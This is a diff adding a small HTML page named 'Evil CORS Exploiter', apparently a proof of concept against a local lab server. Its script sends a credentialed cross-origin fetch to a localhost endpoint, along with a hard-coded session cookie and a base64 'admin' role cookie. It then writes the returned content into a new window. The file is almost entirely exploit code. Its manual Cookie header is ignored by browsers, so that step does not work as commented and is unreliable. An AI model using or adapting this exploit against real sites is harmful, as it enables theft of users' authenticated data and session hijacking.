@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Evil CORS Exploiter</title>
+</head>
+<body>
+    <h1>Evil CORS Exploiter</h1>
+    <button onclick="exploitCORS()">Exploit CORS</button>
+
+    <script>
+        function exploitCORS() {
+            // Include the JSESSIONID and userrole cookies in the fetch request
+            const headers = new Headers();
+            headers.append('Cookie', 'JSESSIONID=82897F19E7BB860F67297E229542CE38; userrole=YWRtaW4=');
+
+            fetch('http://localhost:1337/exploit-cors', {
+                method: 'GET',
+                credentials: 'include',
+                headers: headers
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Open a new window and set its content to the received HTML
+                const newWindow = window.open();
+                newWindow.document.write(data.data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
+
+
